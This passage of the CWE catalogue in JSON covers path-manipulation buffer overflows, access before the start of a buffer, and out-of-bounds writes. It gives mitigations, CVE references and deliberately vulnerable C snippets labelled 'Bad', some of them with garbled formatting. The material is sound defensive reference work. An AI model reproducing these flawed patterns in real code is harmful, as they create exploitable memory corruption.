      "ExtendedDescription": "Passing an inadequately-sized output buffer to a path manipulation function can result in a buffer overflow. Such functions include realpath(), readlink(), PathAppend(), and others.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "676",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "120",
          "ViewID": "1000"
        },
        {
          "Nature": "ChildOf",
          "CweID": "20",
          "ViewID": "700",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Undetermined"
        }
      ],
      "BackgroundDetails": [
        "Windows provides a large number of utility functions that manipulate buffers containing filenames. In most cases, the result is returned in a buffer that is passed in as input. (Usually the filename is modified in place.) Most functions require the buffer to be at least MAX_PATH bytes in length, but you should check the documentation for each function individually. If the buffer is not large enough to store the result of the manipulation, a buffer overflow can occur."
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Modify Memory",
            "Execute Unauthorized Code or Commands",
            "DoS: Crash, Exit, or Restart"
          ]
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Always specify output buffers large enough to handle the maximum-size possible result from path manipulation functions."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In this example the function creates a directory named \"output\\<name>\" in the current directory and returns a heap-allocated copy of its name."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar *createOutputDirectory(char *name) {\n\t\t\tchar outputDirectoryName[128];\n\t\t\tif (getCurrentDirectory(128, outputDirectoryName) == 0) {\n\t\t\t\treturn null;\n\t\t\t}\n\t\t\tif (!PathAppend(outputDirectoryName, \"output\")) {\n\t\t\t\treturn null;\n\t\t\t}\n\t\t\tif (!PathAppend(outputDirectoryName, name)) {\n\t\t\t\t\treturn null;\n\t\t\t}\n\t\t\tif (SHCreateDirectoryEx(NULL, outputDirectoryName, NULL) != ERROR_SUCCESS) {\n\t\t\t\t\treturn null;\n\t\t\t}\n\t\t\treturn StrDup(outputDirectoryName);\n\t}\n```"
            },
            {
              "BodyText": "For most values of the current directory and the name parameter, this function will work properly. However, if the name parameter is particularly long, then the second call to PathAppend() could overflow the outputDirectoryName buffer, which is smaller than MAX_PATH bytes."
            }
          ]
        }
      ],
      "AffectedResources": [
        "Memory",
        "File or Directory"
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "7 Pernicious Kingdoms",
          "EntryName": "Often Misused: File System"
        },
        {
          "TaxonomyName": "Software Fault Patterns",
          "EntryID": "SFP9",
          "EntryName": "Faulty String Expansion"
        }
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-6",
          "Authors": [
            "Katrina Tsipenyuk",
            "Brian Chess",
            "Gary McGraw"
          ],
          "Title": "Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors",
          "Publication": "NIST Workshop on Software Security Assurance Tools Techniques and Metrics",
          "PublicationYear": "2005",
          "PublicationMonth": "11",
          "PublicationDay": "07",
          "Publisher": "NIST",
          "URL": "https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      },
      "Notes": [
        {
          "Type": "Maintenance",
          "Note": "This entry is at a much lower level of abstraction than most entries because it is function-specific. It also has significant overlap with other entries that can vary depending on the perspective. For example, incorrect usage could trigger either a stack-based overflow (CWE-121) or a heap-based overflow (CWE-122). The CWE team has not decided how to handle such entries."
        }
      ]
    },
    {
      "ID": "786",
      "Name": "Access of Memory Location Before Start of Buffer",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product reads or writes to a buffer using an index or pointer that references a memory location prior to the beginning of the buffer.",
      "ExtendedDescription": "This typically occurs when a pointer or its index is decremented to a position before the buffer, when pointer arithmetic results in a position before the beginning of the valid memory location, or when a negative index is used.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality"
          ],
          "Impact": [
            "Read Memory"
          ],
          "Note": "For an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffer's position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences."
        },
        {
          "Scope": [
            "Integrity",
            "Availability"
          ],
          "Impact": [
            "Modify Memory",
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash."
        },
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Memory",
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "If the corrupted memory can be effectively controlled, it may be possible to execute arbitrary code. If the corrupted memory is data rather than instructions, the system will continue to function with improper changes, possibly in violation of an implicit or explicit policy."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-13",
          "Method": "Fuzzing",
          "Description": "Fuzz testing (fuzzing) is a powerful technique for generating large numbers of diverse inputs - either randomly or algorithmically - and dynamically invoking the code with those inputs. Even with random inputs, it is often capable of generating unexpected results such as crashes, memory corruption, or resource consumption. Fuzzing effectively produces repeatable test cases that clearly indicate bugs, which helps developers to diagnose the issues.",
          "Effectiveness": "High"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-87",
          "Entries": [
            {
              "IntroText": "In the following C/C++ example, a utility function is used to trim trailing whitespace from a character string. The function copies the input string to a local character string and uses a while statement to remove the trailing whitespace by moving backward through the string and overwriting whitespace with a NUL character."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar* trimTrailingWhitespace(char *strMessage, int length) {\n\t\t\tchar *retMessage;\n\t\t\tchar *message = malloc(sizeof(char)*(length+1));\n```\n// copy input string to a temporary string* \n\t\t\tchar message[length+1];\n\t\t\tint index;\n\t\t\tfor (index = 0; index < length; index++) {\n\t\t\t```\n\t\t\t\tmessage[index] = strMessage[index];\n\t\t\t}\n\t\t\tmessage[index] = '\\0';\n```\n// trim trailing whitespace* \n\t\t\tint len = index-1;\n\t\t\twhile (isspace(message[len])) {\n\t\t\t```\n\t\t\t\tmessage[len] = '\\0';\n\t\t\t\tlen--;\n\t\t\t}\n```\n// return string without trailing whitespace* \n\t\t\tretMessage = message;\n\t\t\treturn retMessage;}"
            },
            {
              "BodyText": "However, this function can cause a buffer underwrite if the input character string contains all whitespace. On some systems the while statement will move backwards past the beginning of a character string and will call the isspace() function on an address outside of the bounds of the local buffer."
            }
          ]
        },
        {
          "ID": "DX-90",
          "Entries": [
            {
              "IntroText": "The following example asks a user for an offset into an array to select an item."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint main (int argc, char **argv) {\n\t\tchar *items[] = {\"boat\", \"car\", \"truck\", \"train\"};\n\t\tint index = GetUntrustedOffset();\n\t\tprintf(\"You selected %s\\n\", items[index-1]);\n\t}\n```"
            },
            {
              "BodyText": "The programmer allows the user to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read (CWE-126)."
            }
          ]
        },
        {
          "ID": "DX-88",
          "Entries": [
            {
              "IntroText": "The following is an example of code that may result in a buffer underwrite. This code is attempting to replace the substring \"Replace Me\" in destBuf with the string stored in srcBuf. It does so by using the function strstr(), which returns a pointer to the found substring in destBuf. Using pointer arithmetic, the starting index of the substring is found."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint main() { \n\t\t...\n\t\t char *result = strstr(destBuf, \"Replace Me\");\n\t\t int idx = result - destBuf;\n\t\t strcpy(&destBuf[idx], srcBuf);\n\t\t ...\n\t} \n```"
            },
            {
              "BodyText": "In the case where the substring is not found in destBuf, strstr() will return NULL, causing the pointer arithmetic to be undefined, potentially setting the value of idx to a negative number. If idx is negative, this will result in a buffer underwrite of destBuf."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2002-2227",
          "Description": "Unchecked length of SSLv2 challenge value leads to buffer underflow.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-2227"
        },
        {
          "Reference": "CVE-2007-4580",
          "Description": "Buffer underflow from a small size value with a large buffer (length parameter inconsistency, CWE-130)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4580"
        },
        {
          "Reference": "CVE-2007-1584",
          "Description": "Buffer underflow from an all-whitespace string, which causes a counter to be decremented before the buffer while looking for a non-whitespace character.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-1584"
        },
        {
          "Reference": "CVE-2007-0886",
          "Description": "Buffer underflow resultant from encoded data that triggers an integer overflow.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-0886"
        },
        {
          "Reference": "CVE-2006-6171",
          "Description": "Product sets an incorrect buffer size limit, leading to \"off-by-two\" buffer underflow.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-6171"
        },
        {
          "Reference": "CVE-2006-4024",
          "Description": "Negative value is used in a memcpy() operation, leading to buffer underflow.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2006-4024"
        },
        {
          "Reference": "CVE-2004-2620",
          "Description": "Buffer underflow due to mishandled special characters",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2004-2620"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ARR30-C",
          "EntryName": "Do not form or use out-of-bounds pointers or array subscripts",
          "MappingFit": "CWE More Specific"
        }
      ],
      "MappingNotes": {
        "Usage": "Discouraged",
        "Rationale": "The CWE entry might be misused when lower-level CWE entries might be available. It also overlaps existing CWE entries and might be deprecated in the future.",
        "Comments": "If the \"Access\" operation is known to be a read or a write, then investigate children of entries such as CWE-787: Out-of-bounds Write and CWE-125: Out-of-bounds Read.",
        "Reasons": [
          "Potential Deprecation",
          "Frequent Misuse"
        ]
      }
    },
    {
      "ID": "787",
      "Name": "Out-of-bounds Write",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Draft",
      "Diagram": "/data/images/CWE-787-Diagram.png",
      "Description": "The product writes data past the end, or before the beginning, of the intended buffer.",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1000",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1003",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1305",
          "Ordinal": "Primary"
        },
        {
          "Nature": "ChildOf",
          "CweID": "119",
          "ViewID": "1340",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Resultant",
          "Description": "At the point when the product writes data to an invalid location, it is likely that a separate weakness already occurred earlier. For example, the product might alter an index, perform incorrect pointer arithmetic, initialize or release memory incorrectly, etc., thus referencing a memory location outside the buffer."
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Often"
        },
        {
          "Type": "Language",
          "Class": "Assembly",
          "Prevalence": "Undetermined"
        },
        {
          "Type": "Technology",
          "Class": "ICS/OT",
          "Prevalence": "Often"
        }
      ],
      "AlternateTerms": [
        {
          "Term": "Memory Corruption",
          "Description": "Often used to describe the consequences of writing to memory outside the bounds of a buffer, or to memory that is otherwise invalid."
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Integrity"
          ],
          "Impact": [
            "Modify Memory",
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "Write operations could cause memory corruption. In some cases, an adversary can modify control data such as return addresses in order to execute unexpected code."
        },
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "DoS: Crash, Exit, or Restart"
          ],
          "Note": "Attempting to access out-of-range, invalid, or unauthorized memory could cause the product to crash."
        },
        {
          "Scope": [
            "Other"
          ],
          "Impact": [
            "Unexpected State"
          ],
          "Note": "Subsequent write operations can produce undefined or unexpected results."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-1",
          "Method": "Automated Static Analysis",
          "Description": "\n\nThis weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.\n\n\nAutomated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.\n",
          "Effectiveness": "High",
          "EffectivenessNotes": "Detection techniques for buffer-related errors are more mature than for most other weakness types."
        },
        {
          "DetectionMethodID": "DM-2",
          "Method": "Automated Dynamic Analysis",
          "Description": "This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results."
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-3",
          "Phase": [
            "Requirements"
          ],
          "Strategy": "Language Selection",
          "Description": "\n\nUse a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nFor example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.\n\n\nBe wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.\n"
        },
        {
          "MitigationID": "MIT-4.1",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nExamples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.\n",
          "EffectivenessNotes": "This is not a complete solution, since many buffer overflows are not related to strings."
        },
        {
          "MitigationID": "MIT-10",
          "Phase": [
            "Operation",
            "Build and Compilation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "\n\nUse automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. \n\n\n D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail. \n",
          "Effectiveness": "Defense in Depth",
          "EffectivenessNotes": "\n\n This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application. \n"
        },
        {
          "MitigationID": "MIT-9",
          "Phase": [
            "Implementation"
          ],
          "Description": "\n\nConsider adhering to the following rules when allocating and managing an application's memory:\n\n\n  - Double check that the buffer is as large as specified.\n\n  - When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.\n\n  - Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space.\n\n  - If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.\n\n"
        },
        {
          "MitigationID": "MIT-11",
          "Phase": [
            "Operation",
            "Build and Compilation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "\n\nRun or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. \n\n\n Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as \"rebasing\" (for Windows) and \"prelinking\" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. \n\n\n For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335]. \n",
          "Effectiveness": "Defense in Depth",
          "EffectivenessNotes": "These techniques do not provide a complete solution. For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]."
        },
        {
          "MitigationID": "MIT-12",
          "Phase": [
            "Operation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "\n\n Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. \n\n\n For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336]. \n",
          "Effectiveness": "Defense in Depth",
          "EffectivenessNotes": "This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application."
        },
        {
          "MitigationID": "MIT-13",
          "Phase": [
            "Implementation"
          ],
          "Description": "Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.",
          "Effectiveness": "Moderate",
          "EffectivenessNotes": "This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131)."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "The following code attempts to save four different identification numbers into an array."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint id_sequence[3];\n\t/* Populate the id array. */\n\tid_sequence[0] = 123;\n\tid_sequence[1] = 234;\n\tid_sequence[2] = 345;\n\tid_sequence[3] = 456;\n```"
            },
            {
              "BodyText": "Since the array is only allocated to hold three elements, the valid indices are 0 to 2; so, the assignment to id_sequence[3] is out of bounds."
            }
          ]
        },
        {
          "ID": "DX-114",
          "Entries": [
            {
              "IntroText": "In the following code, it is possible to request that memcpy move a much larger segment of memory than assumed:"
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint returnChunkSize(void *) {\n```\n/* if chunk info is valid, return the size of usable memory,* \n\t\t\t\n\t\t\t\n\t\t\t ** else, return -1 to indicate an error* \n\t\t\t\n\t\t\t\n\t\t\t **/* \n\t\t\t...}\n\tint main() {\n\t```\n\t\t...\n\t\tmemcpy(destBuf, srcBuf, (returnChunkSize(destBuf)-1));\n\t\t...\n\t}\n```"
            },
            {
              "BodyText": "If returnChunkSize() happens to encounter an error it will return -1. Notice that the return value is not checked before the memcpy operation (CWE-252), so -1 can be passed as the size argument to memcpy() (CWE-805). Because memcpy() assumes that the value is unsigned, it will be interpreted as MAXINT-1 (CWE-195), and therefore will copy far more memory than is likely available to the destination buffer (CWE-787, CWE-788)."
            }
          ]
        },
        {
          "ID": "DX-1",
          "Entries": [
            {
              "IntroText": "This code takes an IP address from the user and verifies that it is well formed. It then looks up the hostname and copies it into a buffer."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tvoid host_lookup(char *user_supplied_addr){\n\t\t\tstruct hostent *hp;\n\t\t\tin_addr_t *addr;\n\t\t\tchar hostname[64];\n\t\t\tin_addr_t inet_addr(const char *cp);\n```\n/*routine that ensures user_supplied_addr is in the right format for conversion */* \n\t\t\t\n\t\t\tvalidate_addr_form(user_supplied_addr);\n\t\t\taddr = inet_addr(user_supplied_addr);\n\t\t\thp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);\n\t\t\tstrcpy(hostname, hp->h_name);}"
            },
            {
              "BodyText": "This function allocates a buffer of 64 bytes to store the hostname. However, there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker."
            },
            {
              "BodyText": "Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476)."
            }
          ]
        },
        {
          "ID": "DX-19",
          "Entries": [
            {
              "IntroText": "This code applies an encoding procedure to an input string and stores it into a buffer."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar * copy_input(char *user_supplied_string){\n\t\t\tint i, dst_index;\n\t\t\tchar *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);\n\t\t\tif ( MAX_SIZE <= strlen(user_supplied_string) ){\n\t\t\t\tdie(\"user string too long, die evil hacker!\");\n\t\t\t}\n\t\t\tdst_index = 0;\n\t\t\tfor ( i = 0; i < strlen(user_supplied_string); i++ ){\n\t\t\t\t\tif( '&' == user_supplied_string[i] ){\n\t\t\t\t\t\tdst_buf[dst_index++] = '&';\n\t\t\t\t\t\tdst_buf[dst_index++] = 'a';\n\t\t\t\t\t\tdst_buf[dst_index++] = 'm';\n\t\t\t\t\t\tdst_buf[dst_index++] = 'p';\n\t\t\t\t\t\tdst_buf[dst_index++] = ';';\n\t\t\t\t\t}\n\t\t\t\t\telse if ('<' == user_supplied_string[i] ){\n```\n/* encode to &lt; */* \n\t\t\t\t\t\t\t}\n\t\t\t\t\telse dst_buf[dst_index++] = user_supplied_string[i];}\n\t\t\treturn dst_buf;}"
            },
            {
              "BodyText": "The programmer attempts to encode the ampersand character in the user-controlled string. However, the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands."
            }
          ]
        },
        {
          "ID": "DX-87",
          "Entries": [
            {
              "IntroText": "In the following C/C++ code, a utility function is used to trim trailing whitespace from a character string. The function copies the input string to a local character string and uses a while statement to remove the trailing whitespace by moving backward through the string and overwriting whitespace with a NUL character."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tchar* trimTrailingWhitespace(char *strMessage, int length) {\n\t\t\tchar *retMessage;\n\t\t\tchar *message = malloc(sizeof(char)*(length+1));\n```\n// copy input string to a temporary string* \n\t\t\tchar message[length+1];\n\t\t\tint index;\n\t\t\tfor (index = 0; index < length; index++) {\n\t\t\t```\n\t\t\t\tmessage[index] = strMessage[index];\n\t\t\t}\n\t\t\tmessage[index] = '\\0';\n```\n// trim trailing whitespace* \n\t\t\tint len = index-1;\n\t\t\twhile (isspace(message[len])) {\n\t\t\t```\n\t\t\t\tmessage[len] = '\\0';\n\t\t\t\tlen--;\n\t\t\t}\n```\n// return string without trailing whitespace* \n\t\t\tretMessage = message;\n\t\t\treturn retMessage;}"
            },
            {
              "BodyText": "However, this function can cause a buffer underwrite if the input character string contains all whitespace. On some systems the while statement will move backwards past the beginning of a character string and will call the isspace() function on an address outside of the bounds of the local buffer."
            }
          ]
        },
        {
          "ID": "DX-20",
          "Entries": [
            {
              "IntroText": "The following code allocates memory for a maximum number of widgets. It then gets a user-specified number of widgets, making sure that the user does not request too many. It then initializes the elements of the array using InitializeWidget(). Because the number of widgets can vary for each request, the code inserts a NULL pointer to signify the location of the last widget."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint i;\n\tunsigned int numWidgets;\n\tWidget **WidgetList;\n\tnumWidgets = GetUntrustedSizeValue();\n\tif ((numWidgets == 0) || (numWidgets > MAX_NUM_WIDGETS)) {\n\t\tExitError(\"Incorrect number of widgets requested!\");\n\t}\n\tWidgetList = (Widget **)malloc(numWidgets * sizeof(Widget *));\n\tprintf(\"WidgetList ptr=%p\\n\", WidgetList);\n\tfor(i=0; i<numWidgets; i++) {\n\t\tWidgetList[i] = InitializeWidget();\n\t}\n\tWidgetList[numWidgets] = NULL;\n\tshowWidgets(WidgetList);\n```"
            },
            {
              "BodyText": "However, this code contains an off-by-one calculation error (CWE-193). It allocates exactly enough space to contain the specified number of widgets, but it does not include the space for the NULL pointer. As a result, the allocated buffer is smaller than it is supposed to be (CWE-131). So if the user ever requests MAX_NUM_WIDGETS, there is an out-of-bounds write (CWE-787) when the NULL is assigned. Depending on the environment and compilation settings, this could cause memory corruption."
            }
          ]
        },
        {
          "ID": "DX-88",
          "Entries": [
            {
              "IntroText": "The following is an example of code that may result in a buffer underwrite. This code is attempting to replace the substring \"Replace Me\" in destBuf with the string stored in srcBuf. It does so by using the function strstr(), which returns a pointer to the found substring in destBuf. Using pointer arithmetic, the starting index of the substring is found."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tint main() { \n\t\t...\n\t\t char *result = strstr(destBuf, \"Replace Me\");\n\t\t int idx = result - destBuf;\n\t\t strcpy(&destBuf[idx], srcBuf);\n\t\t ...\n\t} \n```"
            },
            {
              "BodyText": "In the case where the substring is not found in destBuf, strstr() will return NULL, causing the pointer arithmetic to be undefined, potentially setting the value of idx to a negative number. If idx is negative, this will result in a buffer underwrite of destBuf."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2021-21220",
          "Description": "Chain: insufficient input validation (CWE-20) in browser allows heap corruption (CWE-787), as exploited in the wild per CISA KEV.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-21220"
        },
        {
          "Reference": "CVE-2021-28664",
          "Description": "GPU kernel driver allows memory corruption because a user can obtain read/write access to read-only pages, as exploited in the wild per CISA KEV.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2021-28664"
        },
        {
          "Reference": "CVE-2020-17087",
          "Description": "Chain: integer truncation (CWE-197) causes small buffer allocation (CWE-131) leading to out-of-bounds write (CWE-787) in kernel pool, as exploited in the wild per CISA KEV.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-17087"
        },
        {
          "Reference": "CVE-2020-1054",
          "Description": "Out-of-bounds write in kernel-mode driver, as exploited in the wild per CISA KEV.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-1054"
        },
        {
          "Reference": "CVE-2020-0041",
          "Description": "Escape from browser sandbox using out-of-bounds write due to incorrect bounds check, as exploited in the wild per CISA KEV.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-0041"
        },
        {
          "Reference": "CVE-2020-0968",
          "Description": "Memory corruption in web browser scripting engine, as exploited in the wild per CISA KEV.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-0968"
        },
        {
          "Reference": "CVE-2020-0022",
          "Description": "chain: mobile phone Bluetooth implementation does not include offset when calculating packet length (CWE-682), leading to out-of-bounds write (CWE-787)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2020-0022"
        },
        {
          "Reference": "CVE-2019-1010006",
          "Description": "Chain: compiler optimization (CWE-733) removes or modifies code used to detect integer overflow (CWE-190), allowing out-of-bounds write (CWE-787).",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2019-1010006"
        },
        {
          "Reference": "CVE-2009-1532",
          "Description": "malformed inputs cause accesses of uninitialized or previously-deleted objects, leading to memory corruption",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-1532"
        },
        {
          "Reference": "CVE-2009-0269",
          "Description": "chain: -1 value from a function call was intended to indicate an error, but is used as an array index instead.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-0269"
        },
        {
          "Reference": "CVE-2002-2227",
          "Description": "Unchecked length of SSLv2 challenge value leads to buffer underflow.",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2002-2227"
        },
        {
          "Reference": "CVE-2007-4580",
          "Description": "Buffer underflow from a small size value with a large buffer (length parameter inconsistency, CWE-130)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4580"
        },
        {
          "Reference": "CVE-2007-4268",
          "Description": "Chain: integer signedness error (CWE-195) passes signed comparison, leading to heap overflow (CWE-122)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2007-4268"
        },
        {
          "Reference": "CVE-2009-2550",
          "Description": "Classic stack-based buffer overflow in media player using a long entry in a playlist",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2550"
        },
        {
          "Reference": "CVE-2009-2403",
          "Description": "Heap-based buffer overflow in media player using a long entry in a playlist",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2009-2403"
        }
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 3-3",
          "EntryName": "Req SR 3.5"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SI-1"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SI-2"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SVV-1"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
          "EntryID": "Part 4-1",
          "EntryName": "Req SVV-3"
        },
        {
          "TaxonomyName": "ISA/IEC 62443",
